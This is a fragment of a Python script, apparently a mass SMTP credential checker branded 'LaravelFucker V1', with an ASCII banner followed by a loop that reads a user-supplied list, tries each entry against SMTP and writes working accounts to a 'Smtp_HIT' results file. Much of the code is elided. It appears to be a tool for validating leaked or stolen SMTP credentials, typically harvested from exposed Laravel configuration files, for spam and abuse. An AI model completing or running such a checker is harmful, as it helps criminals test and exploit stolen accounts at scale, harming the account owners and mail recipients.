...
|  \/  |               /  ___|         | |         /  __ \ |             | |            {red}
| .  . | __ {gr}ZAE3M{red}___  \ `--. _ __ ___ | |_ _ __   | /  \/ |__   ___  ___| | _____ _ __ {ble}
...
\_|  |_/\__,_|___/___/ \____/|_| |_| |_|\__| .__/   \____/_| |_|\___|\___|_|\_\___|_|   {gr}
                                           | |                       {wh}    LaravelFucker {red}V1{res}               
                                           |_|                                          
''')


address = input('Mail To send Working SMTP:')
liists = input('Your List :')
with open(liists) as f:
  for url in f:
    ...
    try:
      ...
      print(f"{gr}(*) Good{res} ===>  + {ur}")
      open('Results/!Smtp_HIT.txt', 'a').write(url + "\n")
      server.quit()
    except:
      print(f"{red}[-] Bad {res}===>  + {ur}")
      pass
